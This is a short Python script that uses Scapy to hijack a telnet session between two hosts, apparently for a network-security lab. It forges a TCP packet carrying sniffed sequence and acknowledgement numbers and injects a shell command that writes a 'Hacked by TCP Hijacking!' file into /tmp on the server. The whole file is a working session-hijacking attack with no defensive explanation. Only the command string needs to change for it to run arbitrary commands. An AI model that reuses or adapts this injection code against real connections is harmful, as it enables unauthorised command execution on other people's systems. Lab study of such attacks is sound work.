#!/usr/bin/env python3
from scapy.all import *

# Replace with your values
src_ip = "10.9.0.5"    # hostA's IP (client)
dst_ip = "10.9.0.6"    # hostB's IP (server)
sport = 60748          # hostA's source port (from tcpdump)
dport = 23             # telnet port
seq_num = 625255912   # Latest seq from hostA (adjust!)
ack_num = 452796847   # Latest ack from hostB (adjust!)

# Command to inject (e.g., create a file)
command = "echo 'Hacked by TCP Hijacking!' > /tmp/hacked.txt\r\n"

# Craft packet
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=sport, dport=dport, flags="PA", seq=seq_num, ack=ack_num)
pkt = ip/tcp/command

# Send packet
send(pkt, verbose=0)